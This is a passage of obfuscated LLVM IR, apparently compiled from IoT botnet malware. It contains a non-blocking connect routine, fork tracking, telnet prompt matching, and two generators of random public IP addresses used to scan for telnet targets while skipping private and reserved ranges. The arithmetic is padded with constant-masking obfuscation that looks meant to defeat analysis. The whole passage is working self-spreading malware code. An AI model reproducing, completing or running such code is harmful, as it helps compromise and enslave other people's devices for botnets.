  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = and i64 %76, %70
  %78 = xor i64 %76, %70
  %79 = or i64 %77, %78
  %80 = or i64 %76, %70
  store i64 %79, i64* %75, align 8
  %81 = load i32, i32* %6, align 4
  %82 = sub i32 0, 1
  %83 = sub i32 %81, %82
  %84 = add nsw i32 %81, 1
  %85 = call i32 @select(i32 %83, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %86 = icmp sgt i32 %85, 0
  br i1 %86, label %87, label %95

; <label>:87:                                     ; preds = %66
  store i32 4, i32* %13, align 4
  %88 = load i32, i32* %6, align 4
  %89 = bitcast i32* %14 to i8*
  %90 = call i32 @getsockopt(i32 %88, i32 1, i32 4, i8* %89, i32* %13) #5
  %91 = load i32, i32* %14, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %87
  store i32 0, i32* %5, align 4
  br label %115

; <label>:94:                                     ; preds = %87
  br label %96

; <label>:95:                                     ; preds = %66
  store i32 0, i32* %5, align 4
  br label %115

; <label>:96:                                     ; preds = %94
  br label %98

; <label>:97:                                     ; preds = %48
  store i32 0, i32* %5, align 4
  br label %115

; <label>:98:                                     ; preds = %96
  br label %99

; <label>:99:                                     ; preds = %98, %40
  %100 = load i32, i32* %6, align 4
  %101 = call i32 (i32, i32, ...) @fcntl(i32 %100, i32 3, i8* null)
  %102 = sext i32 %101 to i64
  store i64 %102, i64* %15, align 8
  %103 = load i64, i64* %15, align 8
  %104 = xor i64 %103, -1
  %105 = xor i64 -2049, -1
  %106 = xor i64 1173450447923589055, -1
  %107 = or i64 %104, %105
  %108 = or i64 1173450447923589055, %106
  %109 = xor i64 %107, -1
  %110 = and i64 %109, %108
  %111 = and i64 %103, -2049
  store i64 %110, i64* %15, align 8
  %112 = load i32, i32* %6, align 4
  %113 = load i64, i64* %15, align 8
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 4, i64 %113)
  store i32 1, i32* %5, align 4
  br label %115

; <label>:115:                                    ; preds = %99, %97, %95, %93, %39
  %116 = load i32, i32* %5, align 4
  ret i32 %116
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %59

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 %11, -3543534738202418173
  %13 = add i64 %12, 1
  %14 = add i64 %13, -3543534738202418173
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = sub i64 0, 1
  %18 = sub i64 %16, %17
  %19 = add i64 %16, 1
  %20 = mul i64 %18, 4
  %21 = call noalias i8* @malloc(i64 %20) #5
  %22 = bitcast i8* %21 to i32*
  store i32* %22, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %23

; <label>:23:                                     ; preds = %42, %10
  %24 = load i32, i32* %4, align 4
  %25 = zext i32 %24 to i64
  %26 = load i64, i64* @numpids, align 8
  %27 = sub i64 %26, -8512003850361170874
  %28 = sub i64 %27, 1
  %29 = add i64 %28, -8512003850361170874
  %30 = sub i64 %26, 1
  %31 = icmp ult i64 %25, %29
  br i1 %31, label %32, label %47

; <label>:32:                                     ; preds = %23
  %33 = load i32*, i32** @pids, align 8
  %34 = load i32, i32* %4, align 4
  %35 = zext i32 %34 to i64
  %36 = getelementptr inbounds i32, i32* %33, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = load i32*, i32** %3, align 8
  %39 = load i32, i32* %4, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds i32, i32* %38, i64 %40
  store i32 %37, i32* %41, align 4
  br label %42

; <label>:42:                                     ; preds = %32
  %43 = load i32, i32* %4, align 4
  %44 = sub i32 0, 1
  %45 = sub i32 %43, %44
  %46 = add i32 %43, 1
  store i32 %45, i32* %4, align 4
  br label %23

; <label>:47:                                     ; preds = %23
  %48 = load i32, i32* %2, align 4
  %49 = load i32*, i32** %3, align 8
  %50 = load i64, i64* @numpids, align 8
  %51 = sub i64 0, 1
  %52 = add i64 %50, %51
  %53 = sub i64 %50, 1
  %54 = getelementptr inbounds i32, i32* %49, i64 %52
  store i32 %48, i32* %54, align 4
  %55 = load i32*, i32** @pids, align 8
  %56 = bitcast i32* %55 to i8*
  call void @free(i8* %56) #5
  %57 = load i32*, i32** %3, align 8
  store i32* %57, i32** @pids, align 8
  %58 = load i32, i32* %2, align 4
  store i32 %58, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %47, %8
  %60 = load i32, i32* %1, align 4
  ret i32 %60
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %114, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %120

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %85, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %83

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = add i64 0, %29
  %31 = sub i64 0, %28
  %32 = getelementptr inbounds i8, i8* %26, i64 %30
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %81, label %36

; <label>:36:                                     ; preds = %22
  %37 = load i8*, i8** %3, align 8
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = add i64 0, -1149473876105866322
  %44 = sub i64 %43, %42
  %45 = sub i64 %44, -1149473876105866322
  %46 = sub i64 0, %42
  %47 = getelementptr inbounds i8, i8* %40, i64 %45
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %81, label %51

; <label>:51:                                     ; preds = %36
  %52 = load i8*, i8** %3, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = add i64 0, -3570464908280914829
  %59 = sub i64 %58, %57
  %60 = sub i64 %59, -3570464908280914829
  %61 = sub i64 0, %57
  %62 = getelementptr inbounds i8, i8* %55, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 13
  br i1 %65, label %81, label %66

; <label>:66:                                     ; preds = %51
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, 5948227553786635863
  %74 = sub i64 %73, %72
  %75 = add i64 %74, 5948227553786635863
  %76 = sub i64 0, %72
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 10
  br label %81

; <label>:81:                                     ; preds = %66, %51, %36, %22
  %82 = phi i1 [ true, %51 ], [ true, %36 ], [ true, %22 ], [ %80, %66 ]
  br label %83

; <label>:83:                                     ; preds = %81, %18
  %84 = phi i1 [ false, %18 ], [ %82, %81 ]
  br i1 %84, label %85, label %91

; <label>:85:                                     ; preds = %83
  %86 = load i32, i32* %7, align 4
  %87 = sub i32 %86, -701759268
  %88 = add i32 %87, 1
  %89 = add i32 %88, -701759268
  %90 = add nsw i32 %86, 1
  store i32 %89, i32* %7, align 4
  br label %18

; <label>:91:                                     ; preds = %83
  %92 = load i8*, i8** %3, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i32, i32* %7, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 0, -2902980863429785002
  %99 = sub i64 %98, %97
  %100 = sub i64 %99, -2902980863429785002
  %101 = sub i64 0, %97
  %102 = getelementptr inbounds i8, i8* %95, i64 %100
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = load i8*, i8** %4, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %104, %110
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %91
  store i32 1, i32* %2, align 4
  br label %121

; <label>:113:                                    ; preds = %91
  br label %114

; <label>:114:                                    ; preds = %113
  %115 = load i32, i32* %6, align 4
  %116 = sub i32 %115, -253647008
  %117 = add i32 %116, 1
  %118 = add i32 %117, -253647008
  %119 = add nsw i32 %115, 1
  store i32 %118, i32* %6, align 4
  br label %11

; <label>:120:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %121

; <label>:121:                                    ; preds = %120, %112
  %122 = load i32, i32* %2, align 4
  ret i32 %122
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %132, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %130, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %130, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp sge i32 %28, 64
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp sle i32 %32, 127
  br i1 %33, label %130, label %34

; <label>:34:                                     ; preds = %30, %26, %22
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 127
  br i1 %37, label %130, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 169
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 254
  br i1 %45, label %130, label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 172
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp sle i32 %52, 16
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sle i32 %56, 31
  br i1 %57, label %130, label %58

; <label>:58:                                     ; preds = %54, %50, %46
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 192
  br i1 %61, label %62, label %70

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %70

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 2
  br i1 %69, label %130, label %70

; <label>:70:                                     ; preds = %66, %62, %58
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 192
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 88
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 99
  br i1 %81, label %130, label %82

; <label>:82:                                     ; preds = %78, %74, %70
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 192
  br i1 %85, label %86, label %90

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 168
  br i1 %89, label %130, label %90

; <label>:90:                                     ; preds = %86, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 198
  br i1 %93, label %94, label %102

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 18
  br i1 %97, label %130, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 19
  br i1 %101, label %130, label %102

; <label>:102:                                    ; preds = %98, %90
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 198
  br i1 %105, label %106, label %114

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 51
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 100
  br i1 %113, label %130, label %114

; <label>:114:                                    ; preds = %110, %106, %102
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 203
  br i1 %117, label %118, label %126

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %126

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 113
  br i1 %125, label %130, label %126

; <label>:126:                                    ; preds = %122, %118, %114
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sge i32 %128, 224
  br label %130

; <label>:130:                                    ; preds = %126, %122, %110, %98, %94, %86, %78, %66, %54, %42, %34, %30, %18, %14
  %131 = phi i1 [ true, %122 ], [ true, %110 ], [ true, %98 ], [ true, %94 ], [ true, %86 ], [ true, %78 ], [ true, %66 ], [ true, %54 ], [ true, %42 ], [ true, %34 ], [ true, %30 ], [ true, %18 ], [ true, %14 ], [ %129, %126 ]
  br i1 %131, label %132, label %145

; <label>:132:                                    ; preds = %130
  %133 = call i32 @rand() #5
  %134 = srem i32 %133, 223
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = call i32 @rand() #5
  %137 = srem i32 %136, 255
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %139 = call i32 @rand() #5
  %140 = srem i32 %139, 255
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %142 = call i32 @rand() #5
  %143 = srem i32 %142, 255
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:145:                                    ; preds = %130
  %146 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %146, i8 0, i64 16, i32 16, i1 false)
  %147 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %148 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %149 = zext i8 %148 to i32
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %153 = zext i8 %152 to i32
  %154 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %155 = zext i8 %154 to i32
  %156 = call i32 (i8*, i8*, ...) @szprintf(i8* %147, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %149, i32 %151, i32 %153, i32 %155)
  %157 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %158 = call i32 @inet_addr(i8* %157) #5
  ret i32 %158
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @TelnetIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

; <label>:62:                                     ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

; <label>:74:                                     ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

; <label>:82:                                     ; preds = %78, %74
